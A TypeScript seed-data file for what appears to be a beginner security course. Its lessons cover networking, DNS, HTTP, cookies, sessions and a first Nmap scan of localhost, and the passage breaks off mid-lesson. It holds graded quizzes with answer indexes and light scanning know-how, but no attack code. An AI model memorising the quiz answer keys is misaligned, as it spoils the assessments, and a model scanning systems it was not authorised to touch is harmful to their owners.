import type { ContentBlock } from '@suraksha/shared';

export type LessonSeed = {
  slug: string;
  title: string;
  summary: string;
  estimatedMinutes: number;
  blocks: ContentBlock[];
};

export type ModuleSeed = {
  slug: string;
  title: string;
  description: string;
  lessons: LessonSeed[];
};

export type PathSeed = {
  slug: string;
  name: string;
  levelNumber: number;
  icon: string;
  sortOrder: number;
  description: string;
  modules: ModuleSeed[];
};

export type ExerciseQuestion = {
  prompt: string;
  options: string[];
  correctIndex: number;
  explanation?: string;
};

export type ExerciseSeed = {
  lessonSlug: string;
  slug: string;
  title: string;
  instructions: string;
  kind: 'quiz';
  xpReward: number;
  questions: ExerciseQuestion[];
};

export const PATH_SEEDS: PathSeed[] = [
  {
    slug: 'foundations',
    name: 'Foundations',
    levelNumber: 0,
    icon: 'shield',
    sortOrder: 0,
    description:
      'Start here if you are brand new. Learn how computers talk to each other, how the web actually works, and how to drive the tools every security professional uses — no prior experience required.',
    modules: [
      {
        slug: 'how-computers-communicate',
        title: 'How Computers Communicate',
        description: 'Networks, IP addresses, ports, and the two transport protocols that carry almost everything.',
        lessons: [
          {
            slug: 'what-is-a-computer-network',
            title: 'What Is a Computer Network?',
            summary:
              'A gentle introduction to networks: what they are, how the Internet fits in, and why every security story starts here.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'What Is a Computer Network?' },
              {
                type: 'paragraph',
                text:
                  'A computer network is simply two or more computers connected so they can exchange data. That exchange happens in tiny chunks called packets: your message, file, or video stream is sliced up, each slice is addressed and shipped independently, and the receiving side reassembles them in order. The Internet is nothing more mystical than a “network of networks” — millions of home, campus, and company networks stitched together by routers that forward packets toward their destination one hop at a time.',
              },
              {
                type: 'paragraph',
                text:
                  'Why should a security student care? Because every attack in history has traveled across these exact wires and radio waves. Whether it is a phishing email, a port scan, or a stolen database download, the attacker is always moving packets between endpoints. Defenders and attackers share the same mental model: identify the endpoints, the links between them, and the services listening on each endpoint. Once you can picture the path your data takes — laptop, to home router, to internet provider, to a server across the world — you can reason about where it can be intercepted, blocked, or abused.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**LAN (Local Area Network)** — the network inside one building, like your home Wi-Fi or an office floor.',
                  '**WLAN (Wireless LAN)** — a LAN connected over radio (Wi-Fi) instead of cables.',
                  '**WAN (Wide Area Network)** — links LANs across cities and countries; the Internet is the biggest WAN.',
                  '**VPN (Virtual Private Network)** — an encrypted tunnel that makes a distant network behave like your local one.',
                ],
              },
              {
                type: 'command',
                description: 'See reachability and round-trip time to a well-known host on the Internet:',
                commands: ['ping 1.1.1.1', 'ping google.com'],
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Everything is addressable',
                text:
                  'If a device can join a network, it can be found, scanned, and talked to. Printers, cameras, smart bulbs, fridges — every “smart” gadget is also attackable software. That mindset shift is the first step in thinking like a security professional.',
              },
              {
                type: 'video',
                provider: 'youtube',
                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                title: 'Placeholder video — networking fundamentals overview',
              },
              {
                type: 'quiz',
                question: 'At its core, what is the Internet?',
                options: [
                  'A single giant computer everyone connects to',
                  'A worldwide network of interconnected smaller networks',
                  'A proprietary system owned by a handful of companies',
                  'A collection of disconnected intranets',
                ],
                correctIndex: 1,
                explanation:
                  'The Internet is often described as a “network of networks”: independent networks agree to exchange traffic using shared protocols.',
              },
            ],
          },
          {
            slug: 'ip-addresses',
            title: 'IP Addresses: The Internet’s Home Addresses',
            summary:
              'Every device on a network needs an address. Learn IPv4, IPv6, and the crucial difference between public and private addresses.',
            estimatedMinutes: 10,
            blocks: [
              { type: 'heading', level: 2, text: 'IP Addresses: The Internet’s Home Addresses' },
              {
                type: 'paragraph',
                text:
                  'An IP address plays the same role for a computer that a street address plays for a house: it tells routers exactly where to deliver your packets. The familiar IPv4 address — something like 192.168.1.10 — is really just a 32-bit number written as four decimal octets, giving about 4.3 billion possible addresses. Because the world ran out of those years ago, most home networks hide dozens of devices behind a single public address using NAT (Network Address Translation), while newer IPv6 addresses — 128 bits long, written in hexadecimal like 2001:db8::1 — provide effectively unlimited space.',
              },
              {
                type: 'paragraph',
                text:
                  'Not all addresses are reachable from the Internet, and knowing which ones is daily bread for security work. Private ranges such as 10.x.x.x, 172.16.x.x–172.31.x.x, and 192.168.x.x exist only inside local networks; they are reused in millions of buildings simultaneously and are never routed on the public Internet. The special address 127.0.0.1 (“localhost”) always means “this machine itself.” When you later run scans or read logs, recognizing these ranges instantly tells you whether you are looking at an internal asset or something exposed to the whole world.',
              },
              {
                type: 'code',
                language: 'text',
                filename: 'address-examples.txt',
                code:
                  '192.168.1.10      private (typical home router range)\n10.0.0.5          private (corporate networks)\n172.16.4.2        private\n8.8.8.8           public (Google DNS)\n127.0.0.1         loopback — this very machine\n::1               IPv6 loopback\n2001:db8::1       IPv6 example (documentation range)',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Private IPv4 ranges:** 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (RFC 1918).',
                  '**Loopback:** 127.0.0.0/8 — traffic never leaves the machine.',
                  '**Link-local:** 169.254.x.x — a device that failed to get a proper address.',
                  '**IPv6:** eight groups of hex digits; ::1 is loopback, fe80::/10 is link-local.',
                ],
              },
              {
                type: 'command',
                description: 'Find the addresses assigned to your own machine:',
                commands: ['ip addr show', 'ipconfig'],
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Private does not mean safe',
                text:
                  '“Private” describes routability, not security. Devices on the same local network can usually reach each other directly, which is exactly why a compromised laptop on office Wi-Fi is dangerous even though it has no public address.',
              },
              {
                type: 'quiz',
                question: 'Which of the following is a PRIVATE IPv4 address?',
                options: ['8.8.8.8', '172.16.4.2', '142.250.72.14', '203.0.113.99'],
                correctIndex: 1,
                explanation:
                  '172.16.0.0 through 172.31.255.255 is one of the three RFC 1918 private ranges. The others are publicly routable addresses.',
              },
            ],
          },
          {
            slug: 'ports',
            title: 'Ports: Many Services, One Machine',
            summary:
              'An IP address gets you to the machine — a port gets you to the service. Learn how software answers on numbered doors.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'Ports: Many Services, One Machine' },
              {
                type: 'paragraph',
                text:
                  'A single server rarely does just one thing. The same machine might run a website, a database, and a mail server at once — all sharing one IP address. Ports solve this: they are 16-bit numbers from 0 to 65535 that let many programs share one network address without colliding. When your browser fetches a page it targets port 443; when a mail client sends mail it targets port 587. The combination of IP address plus port uniquely identifies a conversation partner, like an apartment number added to a street address.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**22** — SSH, encrypted remote shells',
                  '**53** — DNS, name lookups',
                  '**80** — HTTP, plain web traffic',
                  '**443** — HTTPS, encrypted web traffic',
                  '**3306** — MySQL databases',
                  '**3389** — RDP, Windows remote desktop',
                  '**8080** — a common alternative HTTP port',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'A port is called open when some program is listening on it and accepting connections. Every open port is potential attack surface: it is an invitation saying “there is software here you can talk to,” and any software that accepts input can have bugs. That is why the first step of almost every assessment is enumerating open ports, and why hardening guides constantly repeat the same advice — close everything you do not explicitly need, because a forgotten debug service on port 8080 has ended more than one company’s weekend.',
              },
              {
                type: 'command',
                description: 'List the ports currently listening on your own machine:',
                commands: ['netstat -tuln', 'netstat -an'],
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Well-known vs ephemeral',
                text:
                  'Ports 0–1023 are “well-known” and usually require administrator privileges to bind. Ports above 1023 are fair game for any program — and are often chosen by dev servers and malware alike.',
              },
              {
                type: 'quiz',
                question: 'Which port does HTTPS use by default?',
                options: ['80', '22', '443', '8080'],
                correctIndex: 2,
                explanation: '443 is the default port for HTTP over TLS (HTTPS); plain HTTP uses port 80.',
              },
            ],
          },
          {
            slug: 'tcp-and-udp',
            title: 'TCP and UDP',
            summary: 'Two transport protocols, two personalities: reliable delivery versus raw speed.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'TCP and UDP' },
              {
                type: 'paragraph',
                text:
                  'TCP (Transmission Control Protocol) is the dependable courier of the Internet. Before any data flows, client and server perform a three-way handshake — SYN, SYN-ACK, ACK — to agree on a connection. From then on TCP guarantees that every packet arrives, in order, exactly once; lost packets are retransmitted automatically. Web browsing, email, and file downloads all ride on TCP because a missing chunk of a webpage or an archive is worse than a slightly slower transfer.',
              },
              {
                type: 'paragraph',
                text:
                  'UDP (User Datagram Protocol) is the opposite trade-off: it fires datagrams off with no handshake, no ordering, and no retries. If one is lost, UDP shrugs and moves on. That sounds reckless until you consider live video calls, online games, and DNS lookups — situations where yesterday’s packet is worthless and waiting for retransmission makes things worse. Choosing TCP or UDP is really choosing between correctness-with-latency and speed-with-loss, and both choices appear everywhere in real systems.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**TCP** — connection-oriented, three-way handshake, guaranteed order, retransmits losses.',
                  '**UDP** — connectionless, no handshake, best-effort delivery, minimal overhead.',
                  '**TCP users:** HTTP/HTTPS, SSH, email, file transfers.',
                  '**UDP users:** DNS queries, VoIP, gaming, live streaming.',
                  '**Security angle:** SYN scans exploit the handshake; UDP services often answer oddly, making them harder to scan reliably.',
                ],
              },
              {
                type: 'callout',
                variant: 'success',
                title: 'Remember this when scanning',
                text:
                  'Later, when Nmap shows a port as open versus open|filtered, you will be seeing TCP and UDP personalities in action: TCP answers cleanly, while silent UDP leaves you guessing.',
              },
              {
                type: 'quiz',
                question: 'Which protocol would a live video stream most likely prefer, and why?',
                options: [
                  'TCP, because it guarantees every frame arrives',
                  'UDP, because low latency matters more than perfect delivery',
                  'ICMP, because it is faster than both',
                  'Neither — video does not use networks',
                ],
                correctIndex: 1,
                explanation:
                  'Real-time media favors UDP: a late retransmitted frame is useless, so streams tolerate small losses rather than delays.',
              },
            ],
          },
        ],
      },
      {
        slug: 'the-web',
        title: 'The Web',
        description: 'DNS, HTTP, HTTPS, and the request/response cycle that powers every website you have visited.',
        lessons: [
          {
            slug: 'dns',
            title: 'DNS: The Internet’s Phone Book',
            summary: 'How human-friendly names become machine-friendly IP addresses, and why DNS is a favorite attack target.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'DNS: The Internet’s Phone Book' },
              {
                type: 'paragraph',
                text:
                  'Humans remember names; computers route numbers. The Domain Name System bridges the gap by translating names like example.com into IP addresses like 93.184.216.34. DNS is a global hierarchy: at the top sit the root servers, below them the TLD servers (.com, .org, .in), and below those the authoritative servers that actually know each domain’s records. When a resolver does not know an answer, it walks this hierarchy — asking root, then TLD, then authoritative — until someone gives it the record.',
              },
              {
                type: 'paragraph',
                text:
                  'In practice you rarely walk the whole tree yourself. Your operating system asks a caching resolver (often your ISP’s or a public one like 1.1.1.1), which remembers recent answers for a period set by each record’s TTL, or time-to-live. This caching makes the Internet feel fast, but it also means DNS changes propagate slowly — and it creates opportunity for attackers: cache poisoning, spoofed responses, and lookalike domains all abuse the trust we place in names. If a user types yourbank.com and gets an attacker’s IP, every padlock in the world will not save them from typing their password into the wrong site.',
              },
              {
                type: 'list',
                ordered: true,
                items: [
                  'Browser checks its own DNS cache.',
                  'Operating system cache and the hosts file are consulted.',
                  'A recursive resolver (ISP or public) is asked; it serves from cache if possible.',
                  'Resolver queries a root server, which points to the right TLD servers.',
                  'TLD servers point to the domain’s authoritative name server.',
                  'Authoritative server returns the record, and everyone along the way caches it for the TTL.',
                ],
              },
              {
                type: 'command',
                description: 'Resolve a domain yourself and see the answer chain:',
                commands: ['nslookup example.com', 'dig +short example.com'],
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'DNS over HTTPS',
                text:
                  'Traditional DNS queries travel in plaintext, so anyone on the network can see which sites you visit. DoH (DNS over HTTPS) encrypts that lookup — increasingly common in browsers, and increasingly annoying for network defenders who liked reading it.',
              },
              {
                type: 'quiz',
                question: 'What does DNS primarily map?',
                options: [
                  'IP addresses to MAC addresses',
                  'Domain names to IP addresses',
                  'Usernames to passwords',
                  'Ports to process IDs',
                ],
                correctIndex: 1,
                explanation:
                  'DNS translates human-readable domain names into the IP addresses machines use for routing. ARP maps IPs to MACs — different protocol.',
              },
            ],
          },
          {
            slug: 'http',
            title: 'What Is HTTP?',
            summary: 'The request/response protocol behind the web: methods, messages, and statelessness.',
            estimatedMinutes: 10,
            blocks: [
              { type: 'heading', level: 2, text: 'What Is HTTP?' },
              {
                type: 'paragraph',
                text:
                  'HTTP (HyperText Transfer Protocol) is a gloriously simple idea: a client sends a request describing what it wants, and a server sends back a response. Each message starts with a line declaring its intent — GET /login HTTP/1.1 — followed by headers with metadata, a blank line, and optionally a body carrying content. That request/response cycle repeats for every image, script, and stylesheet on a page. Modern versions like HTTP/2 multiplex many requests over one connection, but the mental model stays identical.',
              },
              {
                type: 'code',
                language: 'http',
                filename: 'sample-exchange.http',
                code:
                  'GET /welcome.html HTTP/1.1\nHost: example.com\nUser-Agent: curl/8.0\nAccept: text/html\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1256\n\n<!DOCTYPE html> ...',
              },
              {
                type: 'paragraph',
                text:
                  'Crucially, HTTP is stateless: the server remembers nothing between requests. Every request must carry everything needed to handle it, as if the server had amnesia between breaths. Statelessness made the web scalable — any of ten thousand servers can answer any request — but it created a problem for anything needing continuity, like staying logged in. The fixes for that problem, cookies and sessions, are the subject of upcoming lessons, and their weaknesses are behind a huge share of real-world breaches.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**GET** — retrieve a resource; no side effects expected.',
                  '**POST** — submit data; often changes server state.',
                  '**PUT** — replace a resource at a known location.',
                  '**DELETE** — remove a resource.',
                  '**PATCH** — modify part of a resource.',
                ],
              },
              {
                type: 'video',
                provider: 'youtube',
                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                title: 'Placeholder video — how an HTTP request travels',
              },
              {
                type: 'quiz',
                question: 'Which method should submit form data that changes server state, like creating an account?',
                options: ['GET', 'POST', 'OPTIONS', 'TRACE'],
                correctIndex: 1,
                explanation:
                  'POST carries a body and signals a state change. Sending mutations via GET leaks values into URLs, logs, and browser history.',
              },
            ],
          },
          {
            slug: 'https',
            title: 'HTTPS: Encryption in Transit',
            summary: 'TLS turns plaintext HTTP into an encrypted, authenticated channel — and explains what the padlock really proves.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'HTTPS: Encryption in Transit' },
              {
                type: 'paragraph',
                text:
                  'Plain HTTP is postcard mail: anyone on the path — the café Wi-Fi owner, your ISP, a rogue router — can read and even alter it. HTTPS wraps HTTP inside TLS (Transport Layer Security), turning that postcard into a sealed envelope. During the TLS handshake the two sides negotiate encryption keys, verify the server’s certificate, and establish session keys; afterward, everything is encrypted and tamper-checked. Eavesdroppers see only gibberish flowing to one address.',
              },
              {
                type: 'paragraph',
                text:
                  'But encryption alone invites a trick: an attacker could hand you their own key and pretend to be your bank. Certificates close this hole. A certificate authority (CA) vouches that a specific public key belongs to a specific domain, and your browser trusts a built-in list of CAs to verify that chain of signatures. The padlock therefore proves two things: traffic to this domain is encrypted, and the domain’s identity was confirmed by a CA your browser trusts. Nothing more — read that twice.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Confidentiality** — others cannot read your traffic.',
                  '**Integrity** — tampering in transit is detected.',
                  '**Authenticity** — the server proved its identity with a trusted certificate.',
                ],
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'HTTPS ≠ trustworthy',
                text:
                  'Phishing sites get free certificates too. The padlock means the connection is encrypted to the domain in the bar — it says nothing about who runs that domain or whether they are honest.',
              },
              {
                type: 'quiz',
                question: 'What does the browser padlock icon actually prove?',
                options: [
                  'The website is run by a legitimate company',
                  'The website contains no malware',
                  'Traffic to the certified domain is encrypted and its identity was CA-verified',
                  'Your passwords cannot be stolen on this site',
                ],
                correctIndex: 2,
                explanation:
                  'TLS proves transport security and certificate-based identity for the domain — not honesty, safety, or content quality.',
              },
            ],
          },
          {
            slug: 'requests-and-responses',
            title: 'Requests and Responses',
            summary: 'Dissect a full HTTP round trip: request lines, status codes, and how to watch them with curl.',
            estimatedMinutes: 11,
            blocks: [
              { type: 'heading', level: 2, text: 'Requests and Responses' },
              {
                type: 'paragraph',
                text:
                  'Every HTTP interaction follows the same anatomy. A request begins with a request line — method, path, and version — then headers like Host and User-Agent, then an optional body. The server replies with a status line carrying a three-digit code and reason phrase, its own headers describing the content, and finally the body. Reading these raw messages is not academic: security tools work at exactly this level, and half of web exploitation is crafting requests a browser would never send.',
              },
              {
                type: 'code',
                language: 'http',
                filename: 'round-trip.http',
                code:
                  'GET /missing-page HTTP/1.1\nHost: example.com\nAccept: text/html\nCookie: theme=dark\n\nHTTP/1.1 404 Not Found\nContent-Type: text/html; charset=utf-8\nX-Frame-Options: DENY\n\n<html><body><h1>404 — page not found</h1></body></html>',
              },
              {
                type: 'paragraph',
                text:
                  'Status codes compress a whole verdict into three digits, grouped by first digit. Learning the families lets you skim logs and proxy histories at speed: 2xx success, 3xx redirection, 4xx the client’s mistake, 5xx the server’s meltdown. Certain codes are landmarks during testing — a sudden 403 hints at access control, a 301 reveals where old content moved, and a 500 often means your unexpected input crashed something interesting.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**1xx** — informational, rarely seen.',
                  '**2xx** — success (200 OK, 201 Created, 204 No Content).',
                  '**3xx** — redirection (301 permanent, 302 temporary, 304 cached).',
                  '**4xx** — client error (400 bad request, 401 unauthenticated, 403 forbidden, 404 missing, 429 rate-limited).',
                  '**5xx** — server error (500 crash, 502 bad gateway, 503 unavailable).',
                ],
              },
              {
                type: 'command',
                description: 'Watch a full request and response, headers included:',
                commands: ['curl -v https://example.com', 'curl -i https://example.com'],
              },
              {
                type: 'quiz',
                question: 'You request a page and receive 301 Moved Permanently. What does that tell you?',
                options: [
                  'The page was deleted forever',
                  'Your credentials were rejected',
                  'The resource lives at a new URL and the client should go there',
                  'The server crashed handling the request',
                ],
                correctIndex: 2,
                explanation: '3xx codes redirect; 301 specifically says the move is permanent, so future requests should use the new URL.',
              },
            ],
          },
          {
            slug: 'headers',
            title: 'HTTP Headers',
            summary: 'Headers are the control channel of the web — including several whose entire job is defending the browser.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'HTTP Headers' },
              {
                type: 'paragraph',
                text:
                  'Headers are simple key:value pairs riding above the body of every request and response, yet they steer nearly everything: which host you meant, which languages you accept, how long to cache, who referred you. Tools like curl expose them with a flag, and once you start reading responses deliberately you will spot fingerprints everywhere — which server software runs, which framework generated the page, whether a CDN sat in the middle. Reconnaissance often starts with exactly this kind of polite header gazing.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Content-Security-Policy** — restricts what scripts/styles the page may load; the big anti-XSS lever.',
                  '**Strict-Transport-Security (HSTS)** — forces the browser to use HTTPS for future visits.',
                  '**X-Content-Type-Options** — stops browsers from sniffing around a declared Content-Type.',
                  '**Referrer-Policy** — limits how much URL context leaks to other sites.',
                  '**Set-Cookie flags** — Secure, HttpOnly, SameSite harden individual cookies.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'A second family of headers exists purely for defense. They do not change what the server sends; they instruct the browser to refuse dangerous behavior — loading scripts from random origins, rendering the page inside someone else’s iframe, upgrading images to executable MIME types. Security review checklists treat these headers as seatbelts: cheap, standard, and embarrassing to miss. Later, when a lab asks you to audit a target’s headers, this list is your rubric.',
              },
              {
                type: 'code',
                language: 'http',
                filename: 'security-headers.http',
                code:
                  'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Security-Policy: default-src \'self\'\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff\nReferrer-Policy: strict-origin-when-cross-origin',
              },
              {
                type: 'lab_ref',
                labSlug: 'http-investigation',
                title: 'Try it: HTTP Investigation',
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Check any site in seconds',
                text: 'curl -sI https://site-you-use | sort dumps the response headers. Try it on sites you administer and grade them against the list above.',
              },
              {
                type: 'quiz',
                question: 'Which response header tells the browser to stop executing injected inline scripts from untrusted sources?',
                options: ['Cache-Control', 'Content-Security-Policy', 'Accept-Encoding', 'Server'],
                correctIndex: 1,
                explanation:
                  'CSP declares where scripts, styles, and frames may come from, neutralizing large classes of XSS by construction.',
              },
            ],
          },
        ],
      },
      {
        slug: 'sessions-and-identity',
        title: 'Sessions and Identity',
        description: 'How stateless HTTP learns who you are: sessions, authentication, and authorization.',
        lessons: [
          {
            slug: 'cookies',
            title: 'Cookies',
            summary: 'Small text files that gave the web a memory — and gave attackers something juicy to steal.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'Cookies' },
              {
                type: 'paragraph',
                text:
                  'Because HTTP is stateless, the industry invented cookies: tiny key/value pairs the server asks your browser to store via a Set-Cookie response header, which the browser then attaches automatically to every matching request afterward. That single mechanism powers shopping carts, language preferences, consent banners, and — most importantly — login state. Cookies are not magic; they are just text the client echoes back. All the security depends on what the server puts in them and which attributes restrict their movement.',
              },
              {
                type: 'video',
                provider: 'youtube',
                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                title: 'Placeholder video — how cookies work',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Secure** — cookie is sent only over HTTPS.',
                  '**HttpOnly** — JavaScript cannot read the cookie, blunting XSS theft.',
                  '**SameSite** — controls cross-site sending (Lax/Strict mitigate CSRF).',
                  '**Domain / Path** — scope where the cookie applies.',
                  '**Max-Age / Expires** — persistence; omit both for a session cookie that dies with the tab.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'The attributes matter because of one brutal fact: whoever possesses your session cookie effectively is you, no password required. An attacker who steals it via cross-site scripting, a shared computer, or insecure Wi-Fi can replay it at leisure. That is why HttpOnly and Secure are not optional polish, why SameSite exists, and why cookie theft appears in the kill chain of countless real incidents. Inspect the cookies on sites you log into — the attribute hygiene is instantly visible in devtools.',
              },
              {
                type: 'code',
                language: 'http',
                filename: 'set-cookie.http',
                code:
                  'HTTP/1.1 200 OK\nSet-Cookie: sid=a1b2c3d4e5; Secure; HttpOnly; SameSite=Lax; Path=/\nSet-Cookie: theme=dark; SameSite=Lax; Max-Age=604800',
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Handle with care',
                text:
                  'Never paste your cookies anywhere, and never run scripts that exfiltrate document.cookie — on purpose-built lab targets you will meet this exact theft scenario safely.',
              },
              {
                type: 'quiz',
                question: 'Which cookie attribute prevents JavaScript from reading the cookie?',
                options: ['Secure', 'HttpOnly', 'Path=/', 'Max-Age'],
                correctIndex: 1,
                explanation:
                  'HttpOnly hides the cookie from document.cookie and JavaScript APIs, so XSS payload cannot simply read and ship it away.',
              },
            ],
          },
          {
            slug: 'sessions',
            title: 'Sessions and Authentication',
            summary: 'How servers remember logins across stateless requests, and where session mechanisms go wrong.',
            estimatedMinutes: 9,
            blocks: [
              { type: 'heading', level: 2, text: 'Sessions and Authentication' },
              {
                type: 'paragraph',
                text:
                  'HTTP forgets everything between requests, yet you stay logged in as you click around. The trick is the session pattern. When you submit valid credentials, the server generates a random, unguessable identifier, stores details about your login server-side keyed by that id, and hands the id to your browser in a cookie. From then on every request silently presents the id; the server looks it up, finds “user 42, logged in ten minutes ago,” and treats the request accordingly.',
              },
              {
                type: 'list',
                ordered: true,
                items: [
                  'User submits credentials to a login endpoint.',
                  'Server verifies them against salted password hashes.',
                  'Server creates a session record with a random id and an expiry time.',
                  'The id is sent back as a Set-Cookie header (ideally HttpOnly, Secure, SameSite).',
                  'Each later request carries the cookie; the server validates the id and loads the session.',
                  'Logout deletes the session server-side, not just the cookie.',
                ],
              },
              {
                type: 'paragraph',
                text:
                  'Everything hinges on that identifier being random and kept secret. Sessions fail in depressingly familiar ways: predictable ids that can be guessed, session tokens accepted over plain HTTP, ids that never expire after logout, or tokens leaked in URLs where they land in logs and browser history. Token-based variants like JWT move the storage client-side with cryptographic signatures instead of server-side records — convenient, but they trade revocation headaches for scalability. Whatever the flavor, the security question is identical: can anyone else present a token that the server will accept as yours?',
              },
              {
                type: 'callout',
                variant: 'info',
                title: 'Fixation and timeout',
                text:
                  'Good implementations regenerate the session id at login (preventing fixation) and expire idle sessions. Weak ones let a session live forever — a stolen cookie then works until the heat death of the database row.',
              },
              {
                type: 'quiz',
                question: 'After logging in, what does the server typically rely on to recognize you on the next request?',
                options: [
                  'Your IP address staying the same',
                  'A random session identifier carried in your cookie',
                  'The browser’s User-Agent string',
                  'Nothing — you must re-enter credentials each request',
                ],
                correctIndex: 1,
                explanation:
                  'Session identifiers map requests to server-side login state. IPs change and User-Agents are trivially spoofed; neither is identity.',
              },
            ],
          },
          {
            slug: 'authentication-vs-authorization',
            title: 'Authentication vs Authorization',
            summary: 'Two words that sound alike and fail differently: proving who you are versus deciding what you may do.',
            estimatedMinutes: 7,
            blocks: [
              { type: 'heading', level: 2, text: 'Authentication vs Authorization' },
              {
                type: 'paragraph',
                text:
                  'Authentication (authn) answers “who are you?” — typically by checking something you know (password), something you have (phone, hardware key), or something you are (biometrics). It happens once per login and produces an identity the rest of the system can trust. Multi-factor authentication simply demands proof from more than one category, because any single factor can be phished, guessed, or leaked.',
              },
              {
                type: 'paragraph',
                text:
                  'Authorization (authz) answers the different question “what is this identity allowed to do?” — read this invoice? administer other users? export the database? Authorization runs on essentially every request, checking policies against roles or ownership. The two fail independently: you can be perfectly authenticated while the system still lets you touch resources that are not yours, which is precisely how many serious web vulnerabilities happen.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**Authentication** — establishes identity. Fails via weak passwords, phishing, credential stuffing.',
                  '**Authorization** — enforces permissions. Fails via missing checks, trusting client input, ID confusion.',
                  '**Least privilege** — grant the minimum access needed; smaller blast radius when things go wrong.',
                ],
              },
              {
                type: 'callout',
                variant: 'danger',
                title: 'Broken access control',
                text:
                  'Industry surveys consistently rank broken access control among the most common serious web flaws: pages hidden from the menu but not from direct URLs, object references trusted from the request, admin actions guarded only by the UI. When we test lab applications later, authz gaps will be a recurring quarry.',
              },
              {
                type: 'quiz',
                question: 'You log in as a normal user and find that requesting /admin/users directly returns everyone’s data. Which control failed?',
                options: [
                  'Authentication',
                  'Authorization',
                  'Encryption',
                  'DNS',
                ],
                correctIndex: 1,
                explanation:
                  'You were correctly identified (authenticated); the system just never checked whether that identity may perform the action — an authorization failure.',
              },
            ],
          },
        ],
      },
      {
        slug: 'getting-started-with-tools',
        title: 'Getting Started with Tools',
        description: 'Make friends with the terminal and run your first Nmap scan against a safe local target.',
        lessons: [
          {
            slug: 'command-line-basics',
            title: 'Command Line Basics',
            summary: 'Why security work lives in the terminal, plus the handful of commands you will use daily.',
            estimatedMinutes: 8,
            blocks: [
              { type: 'heading', level: 2, text: 'Command Line Basics' },
              {
                type: 'paragraph',
                text:
                  'Security tooling lives in the terminal. Remote servers you defend or test rarely offer a GUI; exploits, scanners, and log analysis all assume you can type. More importantly, the command line composes: small tools chained together accomplish things no single GUI app can, and anything you can type, you can script. Learning the shell is less about memorizing commands and more about adopting the reflex of looking, filtering, and automating.',
              },
              {
                type: 'command',
                description: 'Orient yourself — print where you are, list contents, and move around:',
                commands: ['pwd', 'ls -la', 'cd /var/log'],
              },
              {
                type: 'paragraph',
                text:
                  'Three ideas carry you surprisingly far. First, paths: absolute paths start at the filesystem root (/), relative paths start where you stand (. is here, .. is up). Second, redirection and pipes: > writes output to a file, | feeds one command’s output into the next command’s input, turning grep into a filter for anything. Third, flags: the dash-prefixed options modify behavior (-l for long listing, -a to show hidden files). Combine those and commands become sentences.',
              },
              {
                type: 'list',
                ordered: false,
                items: [
                  '**man <command>** — built-in manual for nearly everything.',
                  '**history** — what you already typed; great for rebuilding a methodology.',
                  '**grep <pattern>** — search text; pair it with any command via the pipe.',
                  '**find** — locate files by name, size, age, or permission.',
                  '**chmod / chown** — change permissions and ownership (next lessons in the Linux path go deep).',
                ],
              },
              {
                type: 'callout',
                variant: 'success',
                title: 'Tab is your friend',
                text: 'Press Tab to autocomplete paths and command names, and the up arrow to reuse history. Muscle memory beats memorization.',
              },
              {
                type: 'quiz',
                question: 'What does the pipe operator | do in a shell?',
                options: [
                  'Runs two commands only if the first fails',
                  'Sends the first command’s output as input to the second command',
                  'Comments out the rest of the line',
                  'Runs both commands in parallel with separate inputs',
                ],
                correctIndex: 1,
                explanation:
                  'Piping chains programs: `cat access.log | grep 404` filters log lines containing 404 by feeding cat’s output into grep.',
              },
            ],
          },
          {
            slug: 'nmap-first-scan',
            title: 'Nmap: Your First Scan',
            summary: 'Meet the most famous scanner in security and point it at localhost — safely, legally, and with intent.',
            estimatedMinutes: 12,
            blocks: [
              { type: 'heading', level: 2, text: 'Nmap: Your First Scan' },
              {
                type: 'paragraph',
                text:
                  'Nmap (Network Mapper) answers three questions about a machine: which ports are open, which service listens on each, and often which software version answers. It probes thousands of ports using clever packet tricks — default scans use TCP SYN packets, half-opening connections to elicit answers without completing handshakes. Reading a scan report becomes second nature fast: PORT shows the number and protocol, STATE says open/closed/filtered (filtered usually means a firewall swallowed the probe), and version detection adds the fingerprint.',
              },
              {
                type: 'command',
                description: 'Scan your own machine for open ports and running service versions:',
                commands: ['nmap -sV localhost'],
              },
              {
                type: 'paragraph',
                text:
                  'Run that now if you have Docker containers from a lab up — you should see entries like 8081/tcp open http. Each open port is a door; -sV knocks politely and records who answers. Start narrow while learning: scan single hosts you own, add --top-ports 100 to limit noise, and save interesting results with -oN scan.txt. As your mental model grows you will graduate to OS detection (-O), scripts (--script), and timing controls — but the humble version scan remains the workhorse.',
              },
              {
                type: 'callout',
                variant: 'warning',
                title: 'Scan only what you own',
                text:
